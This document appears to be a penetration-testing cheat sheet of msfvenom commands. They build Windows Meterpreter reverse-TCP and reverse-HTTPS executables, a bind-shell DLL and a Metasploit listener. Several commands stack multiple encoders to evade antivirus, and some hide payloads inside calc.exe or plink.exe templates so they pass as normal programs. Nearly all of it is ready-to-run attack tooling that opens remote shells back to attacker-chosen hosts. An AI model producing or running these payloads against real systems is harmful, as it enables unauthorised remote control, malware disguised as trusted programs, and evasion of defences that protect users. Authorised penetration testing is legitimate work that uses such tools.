# Msfvenom

Examples of previously created MSFVenom payloads required in the different scenarios

##### Reverse TCP:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
```

##### Encoded multiple times:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
```

##### Add Windows Calc.exe as a template:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -x calc.exe -e x86/shikata_ga_nai -i 10 -f exe -o meterpreter.exe
```


##### Reverse HTTPS with proxy authentication:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o meterpreter.exe
```

##### Bind Shell - DLL Payload:
```
msfvenom --platform Windows -p windows/shell_bind_tcp LPORT=443 -f DLL -o bind_shell.dll
```

#### Encoding:

```
-e encoder type
-i how man times to encode
```
#### Filler and bad characters:
```
-n the amound of bytes to add at the beginning
-b exclude bad chars (\x00 common filler, searched for by AV)
```


##### MSF Console - start a listener/handler:
```
msfconsole -qx "use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost 10.0.0.1;
set lport 443;
exploit -j"
```


## Custom payload

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
    msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
    msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
    
 

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
    msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 8  -f raw | \
    msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 8  -f raw | \
    msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
    msfvenom -a x86 --platform windows -e x86/fnstenv_mov -i 8  -f raw | \
    msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.234 LPORT=443 R | \
    msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -t exe -c --platform windows /usr/share/windows-binaries/plink.exe -o beffany.exe
